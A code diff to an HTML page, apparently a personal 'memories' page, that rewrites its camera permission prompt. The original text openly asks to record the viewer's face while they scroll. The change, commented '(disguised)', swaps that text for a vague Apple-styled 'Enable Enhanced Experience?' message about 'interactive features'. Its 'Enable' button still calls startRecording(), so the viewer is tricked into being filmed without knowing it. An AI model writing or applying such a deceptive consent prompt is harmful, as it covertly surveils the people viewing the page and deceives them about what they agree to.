@@ -1222,19 +1222,22 @@
     }
 
     .camera-btn.yes {
-      background: linear-gradient(135deg, var(--muted-red) 0%, var(--deep-red) 100%);
+      background: #0071e3;
       color: white;
-      box-shadow: 0 5px 20px rgba(229, 115, 115, 0.4);
+      font-family: -apple-system, sans-serif;
+      font-size: 1rem;
     }
 
     .camera-btn.yes:hover {
-      transform: scale(1.05);
+      background: #0077ed;
     }
 
     .camera-btn.no {
       background: rgba(255,255,255,0.1);
-      color: rgba(255,255,255,0.7);
+      color: rgba(255,255,255,0.6);
       border: 1px solid rgba(255,255,255,0.2);
+      font-family: -apple-system, sans-serif;
+      font-size: 1rem;
     }
 
     .camera-preview {
@@ -1328,13 +1331,14 @@
   </style>
 </head>
 <body>
-  <!-- Camera Permission Prompt -->
+  <!-- Camera Permission Prompt (disguised) -->
   <div class="camera-prompt" id="cameraPrompt">
-    <h2>I want to see your reaction!</h2>
-    <p>Can I record you while you scroll through this? I'd love to see your face when you see all our memories together.</p>
+    <div style="font-size: 3rem; margin-bottom: 1rem;">&#10024;</div>
+    <h2 style="color: white; font-family: -apple-system, sans-serif; font-size: 1.3rem; font-weight: 500;">Enable Enhanced Experience?</h2>
+    <p style="font-size: 0.95rem; color: rgba(255,255,255,0.6);">This page includes interactive features that work better with your camera enabled.</p>
     <div class="camera-prompt-buttons">
-      <button class="camera-btn yes" onclick="startRecording()">Yes, record me! &#128248;</button>
-      <button class="camera-btn no" onclick="skipRecording()">Maybe later</button>
+      <button class="camera-btn yes" onclick="startRecording()">Enable</button>
+      <button class="camera-btn no" onclick="skipRecording()">Skip</button>
     </div>
   </div>
 
